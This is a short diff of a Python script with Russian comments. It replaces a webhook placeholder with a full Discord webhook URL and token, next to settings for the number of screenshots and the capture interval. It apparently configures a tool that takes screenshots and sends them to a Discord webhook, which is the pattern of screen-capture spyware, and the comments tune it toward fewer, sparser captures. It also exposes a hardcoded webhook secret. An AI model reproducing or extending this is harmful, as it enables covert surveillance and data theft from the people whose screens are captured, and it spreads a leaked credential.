@@ -25,7 +25,7 @@ def main():
         import requests
         
         # Ваш вебхук (лучше использовать переменную окружения или конфиг)
-        discord_webhook = "ВАШ_ВЕБХУК_ЗДЕСЬ"
+        discord_webhook = "https://discord.com/api/webhooks/1449862379687903252/Nx7uA0CbDgYwQyrsb2Lm0_gv2loD5_mmTs8AY5v4HlOQRmH3krwBAQnbUKpScdkC9ZrY"
         
         SCREENSHOTS = 3  # Меньше скриншотов
         TIMING = 10      # Больше интервал
